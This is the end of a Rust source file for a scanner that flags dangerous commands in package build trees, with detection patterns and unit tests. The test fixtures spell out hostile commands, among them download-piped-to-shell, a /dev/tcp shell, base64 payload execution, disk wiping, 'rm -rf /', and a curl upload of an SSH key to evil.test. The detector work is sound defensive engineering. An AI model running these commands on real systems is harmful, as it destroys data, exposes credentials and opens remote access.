    (target.starts_with('/') && base.is_empty()) || matches!(base, "~" | "$home" | "${home}")
}

pub fn looks_like_credential_exfiltration(line: &str) -> bool {
    let sends_data = [
        "curl ",
        "wget ",
        "fetch(",
        "requests.post(",
        "axios.post(",
        ".post(",
        ".put(",
        "http.post(",
        "http.request(",
        "upload(",
        "socket.send(",
        "websocket",
    ]
    .iter()
    .any(|pattern| line.contains(pattern));
    if !sends_data {
        return false;
    }

    let reads_secret_variable = [
        "process.env",
        "os.environ",
        "getenv(",
        "cookie",
        "authorization",
        "password",
        "secret",
        "api_key",
        "token",
    ]
    .iter()
    .any(|pattern| line.contains(pattern));
    let reads_sensitive_file = contains_any(line, CREDENTIAL_FILES)
        && [
            " -d @",
            "--data @",
            "--data-binary @",
            "-f @",
            "open(",
            "readfile(",
            "read_file(",
            "read_to_string(",
            "readtext(",
            "read_text(",
            "read_bytes(",
        ]
        .iter()
        .any(|pattern| line.contains(pattern));

    reads_secret_variable || reads_sensitive_file
}

/// Names of prose files, matched as a prefix followed by the end of the name
/// or `.`, `-` or `_`: `LICENSE`, `LICENSE.txt`, `COPYING.LESSER`,
/// `eula_text.html`.
const PROSE_NAMES: &[&str] = &[
    "readme",
    "license",
    "licence",
    "copying",
    "changelog",
    "authors",
    "notice",
    "eula",
    "terms",
];

/// Prose files are sent to the AI review but not matched by the local
/// command rules, where install instructions (`sudo pacman -S ...`) and
/// examples would otherwise block every project with a README.
pub fn is_documentation(rel: &str) -> bool {
    let path = Path::new(rel);
    let name = path
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();
    let extension = path
        .extension()
        .and_then(|extension| extension.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();

    if matches!(
        extension.as_str(),
        "md" | "markdown" | "rst" | "adoc" | "asciidoc" | "org" | "changelog"
    ) {
        return true;
    }

    // License texts: by name, or anywhere under a REUSE-style `LICENSES/`.
    let prose_name = PROSE_NAMES.iter().any(|prose| {
        name.strip_prefix(prose)
            .is_some_and(|rest| rest.is_empty() || rest.starts_with(['.', '-', '_']))
    });
    let in_licenses = path.parent().is_some_and(|parent| {
        parent.components().any(|component| {
            component.as_os_str().to_str().is_some_and(|name| {
                matches!(name.to_ascii_lowercase().as_str(), "licenses" | "licences")
            })
        })
    });
    // A script or config named like a license still runs.
    let prose_extension =
        matches!(extension.as_str(), "html" | "htm") || !is_executable_or_runtime_config(rel);
    (prose_name || in_licenses) && prose_extension
}

/// Files whose URLs are likely to be requested when the software runs.
pub fn is_executable_or_runtime_config(rel: &str) -> bool {
    let path = Path::new(rel);
    let name = path
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();
    let extension = path
        .extension()
        .and_then(|extension| extension.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();

    matches!(
        extension.as_str(),
        "bash"
            | "bat"
            | "c"
            | "cc"
            | "cmd"
            | "cpp"
            | "cs"
            | "cjs"
            | "conf"
            | "css"
            | "desktop"
            | "ex"
            | "exs"
            | "fish"
            | "go"
            | "h"
            | "html"
            | "hpp"
            | "ini"
            | "java"
            | "json"
            | "js"
            | "jsx"
            | "kt"
            | "lua"
            | "mjs"
            | "php"
            | "pl"
            | "ps1"
            | "py"
            | "pyw"
            | "rb"
            | "rs"
            | "scala"
            | "sc"
            | "service"
            | "sh"
            | "svg"
            | "swift"
            | "toml"
            | "ts"
            | "tsx"
            | "xml"
            | "yaml"
            | "yml"
    ) || matches!(
        name.as_str(),
        "dockerfile"
            | "makefile"
            | "pkgbuild"
            | ".install"
            | ".bashrc"
            | ".zshrc"
            | ".profile"
            | ".bash_profile"
            | ".zprofile"
            | ".xprofile"
            | "package.json"
    )
}

/// Whether a relative path looks like it holds credentials. The check uses
/// the path inside the reviewed tree, so where the tree itself lives (for
/// example under `~/secrets/`) does not matter.
pub fn is_sensitive_path(rel: &str) -> bool {
    let lower = rel.to_lowercase();
    let name = lower.rsplit('/').next().unwrap_or_default();

    lower.split('/').any(|component| {
        matches!(
            component,
            ".ssh" | ".aws" | ".gnupg" | "credentials" | "secrets"
        )
    }) || name.starts_with(".env.")
        || name.starts_with(".env_")
        || ["secret", "credential"]
            .iter()
            .any(|word| name.contains(word))
        || name
            .split(|character: char| !character.is_ascii_alphanumeric())
            .any(|word| word == "token" || word == "tokens")
        || [
            ".pem",
            ".key",
            ".p12",
            ".pfx",
            ".keystore",
            ".jks",
            ".kdbx",
            ".tfstate",
            ".tfvars",
            ".tfvars.json",
            // `.env` itself and `prod.env`.
            ".env",
        ]
        .iter()
        .any(|extension| name.ends_with(extension))
        // Files that hold a login by their purpose. `.npmrc` and `.envrc`
        // are not among them: projects ship those as plain settings, and
        // withholding one makes a review incomplete.
        || matches!(
            name,
            ".pypirc" | ".netrc" | "id_rsa" | "id_ed25519" | "id_ecdsa" | "id_dsa"
        )
        || lower.ends_with(".kube/config")
        || lower.ends_with(".docker/config.json")
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Scheme {
    Http,
    Https,
}

impl Scheme {
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::Http => "http",
            Self::Https => "https",
        }
    }
}

/// Literal HTTP(S) destinations in a line, reduced to scheme and host so
/// paths, queries and credentials in URLs are never echoed.
pub fn extract_network_destinations(line: &str) -> Vec<(Scheme, String)> {
    let lower = line.to_ascii_lowercase();
    let mut result = Vec::new();
    let mut cursor = 0;
    // A DTD reference names a vocabulary; nothing requests it.
    let doctype = lower.contains("<!doctype");

    while cursor < lower.len() {
        // One search per candidate: finding each prefix separately rescans
        // the rest of the line for the absent one every time, which is
        // quadratic on a line of many `http://` URLs.
        let Some(offset) = lower[cursor..].find("http") else {
            break;
        };
        let candidate = &lower[cursor + offset..];
        let Some((prefix, scheme)) = [("https://", Scheme::Https), ("http://", Scheme::Http)]
            .into_iter()
            .find(|(prefix, _)| candidate.starts_with(prefix))
        else {
            cursor += offset + "http".len();
            continue;
        };

        let start = cursor + offset;
        let rest = &lower[start..];
        let end = rest
            .char_indices()
            .find_map(|(index, character)| {
                (character.is_whitespace()
                    || matches!(
                        character,
                        '"' | '\'' | '`' | '<' | '>' | ')' | ']' | '}' | ',' | ';'
                    ))
                .then_some(index)
            })
            .unwrap_or(rest.len());
        let url = rest[..end]
            .get(..512)
            .unwrap_or(&rest[..end])
            .trim_end_matches(['.', ':', '?', '!', '\\']);

        if let Some(host) = url_host(&url[prefix.len().min(url.len())..])
            && !doctype
            && !Path::new(url)
                .extension()
                .is_some_and(|extension| extension == "dtd" || extension == "xsd")
            && !is_identifier_uri(&lower[..start])
        {
            result.push((scheme, host));
        }
        cursor = start + end.max(prefix.len());
    }

    result.sort();
    result.dedup();
    result
}

/// XML namespace and RDF URIs name a vocabulary; nothing requests them.
/// `before` is the lowercased text preceding the URL on its line.
fn is_identifier_uri(before: &str) -> bool {
    let Some(before) = before.strip_suffix(['"', '\'']) else {
        return false;
    };
    let Some(attribute) = before.trim_end().strip_suffix('=') else {
        return false;
    };
    let attribute = attribute
        .trim_end()
        .rsplit(|character: char| character.is_whitespace() || character == '<')
        .next()
        .unwrap_or_default();
    attribute == "xmlns"
        || attribute.starts_with("xmlns:")
        || matches!(
            attribute,
            "rdf:resource" | "rdf:about" | "xsi:schemalocation" | "xsi:nonamespaceschemalocation"
        )
}

fn url_host(after_scheme: &str) -> Option<String> {
    let authority = after_scheme
        .split(['/', '?', '#'])
        .next()
        .unwrap_or_default();
    let authority = authority.rsplit('@').next().unwrap_or_default();
    let host = if authority.starts_with('[') {
        authority
            .split_once(']')
            .map_or(authority, |(address, _)| address)
            .to_string()
            + "]"
    } else {
        authority.split(':').next().unwrap_or_default().to_string()
    };
    (!host.is_empty() && host != "]").then_some(host)
}

pub fn is_local_host(host: &str) -> bool {
    matches!(host, "localhost" | "127.0.0.1" | "::1" | "[::1]") || host.ends_with(".localhost")
}

pub fn is_ip_host(host: &str) -> bool {
    host.trim_start_matches('[')
        .trim_end_matches(']')
        .parse::<IpAddr>()
        .is_ok()
}

#[cfg(test)]
mod tests {
    use super::{
        RuleId, Scheme, extract_network_destinations, is_documentation, is_download_piped_to_shell,
        is_encoded_data_executed, is_ip_host, is_sensitive_path, line_rules,
        looks_like_credential_exfiltration, removes_root_or_home,
    };

    fn rules_for(line: &str) -> Vec<RuleId> {
        let lowered = line.to_lowercase();
        line_rules(&lowered, &lowered).collect()
    }

    #[test]
    fn common_variants_of_each_rule_are_caught() {
        let cases: &[(&str, RuleId)] = &[
            (
                "curl -fsSL https://x.test/i | sudo bash",
                RuleId::DownloadAndExecute,
            ),
            (
                "curl -fsSL https://x.test/i |/bin/sh",
                RuleId::DownloadAndExecute,
            ),
            ("sh <(curl -s https://x.test/i)", RuleId::DownloadAndExecute),
            (
                "bash -c \"$(wget -qO- https://x.test/i)\"",
                RuleId::DownloadAndExecute,
            ),
            (
                "aria2c -o - https://x.test/i | sh",
                RuleId::DownloadAndExecute,
            ),
            ("exec 3<>/dev/tcp/10.0.0.1/4444", RuleId::DownloadAndExecute),
            ("echo aGk= | base64 -d|sh", RuleId::EncodedCommandExecution),
            (
                "echo aGk= | base64 -di | sudo bash",
                RuleId::EncodedCommandExecution,
            ),
            ("xxd -r -p payload | bash", RuleId::EncodedCommandExecution),
            ("doas pacman -U x", RuleId::PrivilegeEscalation),
            ("run0 systemctl enable x", RuleId::PrivilegeEscalation),
            ("chmod +s /usr/bin/x", RuleId::PrivilegeEscalation),
            ("install -m4755 x /usr/bin/x", RuleId::PrivilegeEscalation),
            ("cat ~/.git-credentials", RuleId::CredentialFileAccess),
            ("tar c ~/.password-store", RuleId::CredentialFileAccess),
            ("exec-once = ~/.cache/x", RuleId::PersistenceModification),
            (
                "cp x ~/.config/omarchy/hooks/post-update",
                RuleId::PersistenceModification,
            ),
            (
                "cp p $pkgdirZ$HOME/.config/autostart/x.desktop",
                RuleId::PersistenceModification,
            ),
            (
                "dd of=/dev/sda if=/dev/zero",
                RuleId::DestructiveSystemOperation,
            ),
            ("wipefs -a /dev/nvme0n1", RuleId::DestructiveSystemOperation),
            (
                "__import__('os').system('id')",
                RuleId::ShellCommandExecution,
            ),
            (
                "subprocess.check_output(cmd, shell=True)",
                RuleId::ShellCommandExecution,
            ),
        ];
        for (line, rule) in cases {
            assert!(
                rules_for(line).contains(rule),
                "{line}: {:?}",
                rules_for(line)
            );
        }
        for line in [
            "install -Dm644 x.desktop \"$pkgdir\"/etc/xdg/autostart/x.desktop",
            "cp x ${pkgdir}/etc/profile.d/x.sh",
            "curl -fsSL https://x.test/a || sh fallback.sh",
            "dd if=image.iso of=/dev/null",
        ] {
            assert!(rules_for(line).is_empty(), "{line}: {:?}", rules_for(line));
        }
    }

    #[test]
    fn detects_download_piped_to_a_shell() {
        assert!(is_download_piped_to_shell(
            "curl https://example.test/install | bash -s"
        ));
        assert!(is_download_piped_to_shell(
            "wget -qo- https://example.test/install | sh"
        ));
        assert!(!is_download_piped_to_shell(
            "curl -o installer.sh https://example.test/install"
        ));
        assert!(!is_download_piped_to_shell(
            "curl https://example.test/data | tee data.txt"
        ));
        assert!(!is_download_piped_to_shell(
            "curl https://example.test/data | shasum"
        ));
        for substituted in [
            "echo \"$(curl https://example.test/p | sh)\"",
            "x=`wget -qo- https://example.test/p | bash`",
            "bash -c \"curl https://example.test/p | sh\"",
            "curl https://example.test/p | sh; echo done",
            "curl https://example.test/p | sh&",
        ] {
            assert!(is_download_piped_to_shell(substituted), "{substituted}");
        }
        assert!(!is_download_piped_to_shell(
            "curl https://example.test/data | shellcheck -"
        ));
    }

    #[test]
    fn a_fetcher_or_shell_in_a_variable_is_what_runs() {
        use super::{command_variables, is_download_piped_to_shell, with_variables};
        let variables = command_variables("F=curl\nexport S=\"/bin/bash\"\nX=hello world\n");
        assert_eq!(
            variables,
            [
                ("f".to_string(), "curl".to_string()),
                ("s".to_string(), "bash".to_string())
            ]
        );
        let line = with_variables("$f -fssl https://x.example/i | ${s}", &variables);
        assert!(is_download_piped_to_shell(&line), "{line}");
        assert_eq!(with_variables("$fx $s_y", &variables), "$fx $s_y");
    }

    #[test]
    fn what_a_line_runs_is_named() {
        use super::run_targets;
        for (line, expected) in [
            ("sh ./install.sh --yes", &["install.sh"][..]),
            (". ./lib/common", &["lib/common"]),
            (
                "python3.12 tools/gen.py && ./build/run",
                &["tools/gen.py", "build/run"],
            ),
            ("cat payload.bin | sh", &["payload.bin"]),
            ("sh <data/x.png", &["data/x.png"]),
            ("FOO=1 bash -e scripts/x.sh", &["scripts/x.sh"]),
        ] {
            assert_eq!(run_targets(line), expected, "{line}");
        }
        // Many pipes cost one pass.
        let long = "a|".repeat(200_000);
        let started = std::time::Instant::now();
        assert!(run_targets(&long).is_empty());
        assert!(started.elapsed().as_secs() < 10);
        assert_eq!(run_targets("nohup sh ./x.sh &"), ["x.sh"]);
        for line in [
            "sh -c 'echo hi'",
            "bash -n x.sh",
            "python -m pip install x",
            "cat notes.txt",
            "echo sh x",
        ] {
            assert!(run_targets(line).is_empty(), "{line}");
        }
    }

    #[test]
    fn a_download_saved_to_a_file_is_followed_to_where_it_runs() {
        use super::{continues, fetched_file, runs_file};
        for (line, file) in [
            (
                "curl -fssl https://x.example/i.sh -o /tmp/i.sh",
                "/tmp/i.sh",
            ),
            ("curl https://x.example/i.sh > ./i.sh", "i.sh"),
            ("curl https://x.example/i.sh >i.sh", "i.sh"),
            ("curl -O https://x.example/a/i.sh?x=1", "i.sh"),
            ("sudo wget -q https://x.example/a/i.sh", "i.sh"),
            ("wget -O \"$tmp\" https://x.example/a/i.sh", "$tmp"),
            ("wget -o fetch.log https://x.example/a/i.sh", "i.sh"),
            ("aria2c --out=i.sh https://x.example/a", "i.sh"),
        ] {
            assert_eq!(fetched_file(line).as_deref(), Some(file), "{line}");
        }
        assert_eq!(fetched_file("curl https://x.example/i.sh"), None);
        assert_eq!(fetched_file("wget -qO- https://x.example/i.sh"), None);
        assert_eq!(fetched_file("wget -O- https://x.example/i.sh"), None);
        assert_eq!(fetched_file("wget -O - https://x.example/i.sh"), None);
        for line in [
            "wget -qO- https://x.example/i.sh > i.sh",
            "wget -q https://x.example/i.sh -O - >> i.sh",
            "wget --output-document=- https://x.example/i.sh >i.sh",
            "curl -o - https://x.example/i.sh > i.sh",
        ] {
            assert_eq!(fetched_file(line).as_deref(), Some("i.sh"), "{line}");
        }
        assert_eq!(fetched_file("echo saved > out.txt"), None);

        for line in [
            "sh i.sh",
            "sudo bash ./i.sh --yes",
            ". i.sh",
            "chmod +x i.sh && ./i.sh",
            "if true; then python3 i.sh; fi",
        ] {
            assert!(runs_file(line, "i.sh"), "{line}");
        }
        assert!(runs_file("bash i.sh -n", "i.sh"));
        assert!(!runs_file("bash -n i.sh", "i.sh"));
        assert!(runs_file("perl -n i.sh", "i.sh"));
        assert!(runs_file("bash -m i.sh", "i.sh"));
        assert!(runs_file("bash \"$tmp\"", "$tmp"));
        assert!(runs_file("\"$tmp\" --install", "$tmp"));
        for line in [
            "cat i.sh",
            "chmod +x i.sh",
            "sh other.sh",
            "echo sh i.sh > log",
        ] {
            assert!(!runs_file(line, "i.sh"), "{line}");
        }

        assert!(continues("curl https://x.example/i.sh \\", "  | sh"));
        assert!(continues("curl https://x.example/i.sh |", "sh"));
        assert!(continues("curl https://x.example/i.sh", "  | sh"));
        assert!(!continues("curl https://x.example/i.sh", "sh i.sh"));
    }

    #[test]
    fn encoded_data_is_only_flagged_when_it_is_executed() {
        assert!(is_encoded_data_executed("exec(base64.b64decode(payload))"));
        assert!(!is_encoded_data_executed(
            "payload = base64.b64decode(encoded_data)"
        ));
    }

    #[test]
    fn recursive_removal_only_matches_root_or_home_itself() {
        for dangerous in [
            "rm -rf /",
            "sudo rm -rf / ",
            "rm -rf /*",
            "rm -fr ~/",
            "rm -r --no-preserve-root /",
            "rm -rf \"$home\"",
            "rm -rf ${home}/*",
            "/usr/bin/rm -rf ~",
            "rm / -rf",
        ] {
            assert!(removes_root_or_home(dangerous), "missed {dangerous:?}");
        }
        for ordinary in [
            "rm -rf /tmp/build",
            "rm -rf /usr/share/foo",
            "rm -rf \"$pkgdir\"",
            "rm -rf ~/.cache/thing",
            "rm -f /",
            "rm -rf build; ls /",
            "echo rm -rf",
        ] {
            assert!(!removes_root_or_home(ordinary), "flagged {ordinary:?}");
        }
    }

    #[test]
    fn sandbox_helper_setuid_is_expected_packaging() {
        for packaging in [
            "chmod 4755 \"${pkgdir}\"/opt/1password/chrome-sandbox",
            "chmod 4755 \"$pkgdir/opt/brave-bin/chrome-sandbox\";",
            "chmod 4755 '/opt/obsidian/chrome-sandbox' || true",
            "chmod u+s chrome-sandbox",
            "chmod 4755 \"${pkgdir}/opt/grok bot/chrome-sandbox\"",
            "chmod 4755 \"${pkgdir}/opt/microsoft/msedge/msedge-sandbox\"",
            "chmod 4755 \"$pkgdir/usr/lib/opera-gx/opera_sandbox\"",
            "chown root \"$pkgdir/usr/lib/chromium/chrome-sandbox\"",
        ] {
            assert!(
                !rules_for(packaging).contains(&RuleId::PrivilegeEscalation),
                "{packaging}"
            );
        }
        for escalation in [
            "chmod 4755 /opt/x/chrome-sandbox && sudo id",
            "chmod 4755 /opt/x/chrome-sandbox /usr/bin/bash",
            "chmod 4755 /opt/x/chrome-sandbox-helper",
            "chmod 4755 /opt/x/chrome-sandbox; chmod u+s /usr/bin/bash",
            "chmod u+s /usr/bin/bash",
            "chown root /usr/bin/x",
        ] {
            assert!(
                rules_for(escalation).contains(&RuleId::PrivilegeEscalation),
                "{escalation}"
            );
        }
    }

    #[test]
    fn packaging_a_mkfs_program_is_not_running_it() {
        for packaging in [
            "install -dm755 \"$srcdir/docker-sbx/mkfs.erofs\" \\",
            "\"$pkgdir/usr/lib/${pkgname}/libexec/mkfs.erofs\"",
            "sudo install -m755 mkfs.x /usr/bin/",
            "ln -s mkfs.ext4 \"$pkgdir/usr/bin/mkfs.ext3\"",
        ] {
            assert!(
                !rules_for(packaging).contains(&RuleId::DestructiveSystemOperation),
                "{packaging}"
            );
        }
        for running in [
            "mkfs.ext4 /dev/sda",
            "sudo mkfs.vfat -f32 \"$dev\"",
            "os.system(\"mkfs.ext4 /dev/sda\")",
            "install x mkfs.y; mkfs.ext4 /dev/sda",
            "x=$(mkfs.btrfs -f /dev/sdb)",
        ] {
            assert!(
                rules_for(running).contains(&RuleId::DestructiveSystemOperation),
                "{running}"
            );
        }
    }

    #[test]
    fn packaged_startup_files_are_not_persistence() {
        for packaging in [
            "install -dm644 x.sh \"${pkgdir}/etc/profile.d/x.sh\"",
            "} >>\"${pkgdir}/etc/profile.d/x.sh\"",
            "\"$pkgdir\"/etc/cron.daily/ \\",
            "install -d -m644 x.timer \"$pkgdir/etc/systemd/system/x.timer\"",
        ] {
            assert!(
                !rules_for(packaging).contains(&RuleId::PersistenceModification),
                "{packaging}"
            );
        }
        for persistence in [
            "cp x.sh /etc/profile.d/",
            "echo x >> ~/.bashrc",
            "cp x \"$pkgdir/../../etc/cron.d\" /etc/cron.daily/x",
            "install x \"$srcdir/etc/systemd/system/x\"",
            "cat x >> \"$pkgdir/../../../../.bashrc\"",
            "cp x \"${pkgdir}\"/../../.config/autostart/x.desktop",
        ] {
            assert!(
                rules_for(persistence).contains(&RuleId::PersistenceModification),
                "{persistence}"
            );
        }
    }

    #[test]
    fn identifier_patterns_respect_word_boundaries() {
        assert!(rules_for("eval(payload)").contains(&RuleId::ShellCommandExecution));
        assert!(rules_for("x = $(eval(\"a\"))").contains(&RuleId::ShellCommandExecution));
        assert!(rules_for("results = retrieval(query)").is_empty());
        assert!(rules_for("model.eval()").is_empty());
        assert!(rules_for("cleanup_build() { rm -rf /tmp/build; }").is_empty());
        assert!(rules_for("rm -rf /").contains(&RuleId::DestructiveSystemOperation));
    }

    #[test]
    fn prose_files_are_documentation() {
        assert!(is_documentation("README.md"));
        assert!(is_documentation("docs/install.rst"));
        assert!(is_documentation("LICENSE"));
        assert!(!is_documentation("install.sh"));
        assert!(!is_documentation("PKGBUILD"));
    }

    #[test]
    fn license_texts_are_documentation_unless_they_are_code() {
        for prose in [
            "LICENSE.txt",
            "LICENSE-MIT",
            "COPYING.LESSER",
            "LICENSES/0BSD.txt",
            "eula_text.html",
            "terms.html",
            "aurutils.changelog",
        ] {
            assert!(is_documentation(prose), "{prose}");
        }
        for code in [
            "license.sh",
            "LICENSES/check.py",
            "licensed.txt",
            "eula.js",
            "terminal.sh",
        ] {
            assert!(!is_documentation(code), "{code}");
        }
    }

    #[test]
    fn printed_messages_only_hide_context_rules() {
        let code = "sudo a; curl https://x.test/i | sh";
        let quiet = "";
        let rules: Vec<RuleId> = line_rules(code, quiet).collect();
        assert_eq!(rules, [RuleId::DownloadAndExecute]);
    }

    #[test]
    fn sensitive_paths_are_judged_inside_the_tree() {
        assert!(is_sensitive_path(".env.production"));
        assert!(is_sensitive_path("config/private.pem"));
        assert!(is_sensitive_path(".aws/credentials"));
        for path in [
            ".pypirc",
            "deploy/.netrc",
            "keys/id_ed25519",
            "home/.kube/config",
            "store.kdbx",
            "infra/terraform.tfstate",
            "deploy/prod.env",
            "infra/prod.tfvars",
            "infra/prod.auto.tfvars.json",
            ".git-credentials",
        ] {
            assert!(is_sensitive_path(path), "{path}");
        }
        assert!(!is_sensitive_path(".npmrc"));
        assert!(!is_sensitive_path("id_ed25519.pub"));
        assert!(!is_sensitive_path("kube/config.yaml"));

        assert!(is_sensitive_path("secrets/app.conf"));
        assert!(!is_sensitive_path("src/tokenizer.rs"));
        assert!(!is_sensitive_path("hyprland.lua"));
    }

    #[test]
    fn network_inventory_redacts_url_paths_and_credentials() {
        assert_eq!(
            extract_network_destinations(
                "requests.post('https://user:pass@API.example.test/upload?token=secret')"
            ),
            vec![(Scheme::Https, "api.example.test".to_string())]
        );
        assert_eq!(
            extract_network_destinations("fetch(\"http://[2001:db8::1]:8080/x\") http://a.test"),
            vec![
                (Scheme::Http, "[2001:db8::1]".to_string()),
                (Scheme::Http, "a.test".to_string()),
            ]
        );
        assert!(extract_network_destinations("see https:// for details").is_empty());
        assert_eq!(
            extract_network_destinations("httpx http:/ HTTPS://b.test http://a.test"),
            vec![
                (Scheme::Http, "a.test".to_string()),
                (Scheme::Https, "b.test".to_string()),
            ]
        );
        let many = "http://a ".repeat(250_000);
        let started = std::time::Instant::now();
        assert_eq!(extract_network_destinations(&many).len(), 1);
        assert!(started.elapsed().as_secs() < 10, "{:?}", started.elapsed());
        assert!(
            extract_network_destinations(
                "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:dc='http://purl.org/dc/elements/1.1/'>"
            )
            .is_empty()
        );
        assert!(
            extract_network_destinations(
                "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">"
            )
            .is_empty()
        );
        assert_eq!(
            extract_network_destinations(
                "<image href=\"http://a.test/x.png\" xmlns=\"http://www.w3.org/2000/svg\"/>"
            ),
            vec![(Scheme::Http, "a.test".to_string())]
        );
        assert!(is_ip_host("[2001:db8::1]"));
        assert!(is_ip_host("198.51.100.8"));
        assert!(!is_ip_host("example.test"));
    }

    #[test]
    fn flags_sensitive_uploads_only() {
        assert!(looks_like_credential_exfiltration(
            "requests.post(url, data=os.environ['token'])"
        ));
        assert!(looks_like_credential_exfiltration(
            "curl -x post --data-binary @$home/.ssh/id_ed25519 https://evil.test"
        ));
        assert!(!looks_like_credential_exfiltration(
            "curl -x post -d \"$home/.ssh/id_ed25519\" https://api.example.test"
        ));
        assert!(!looks_like_credential_exfiltration(
            "requests.get(public_url)"
        ));
    }
}
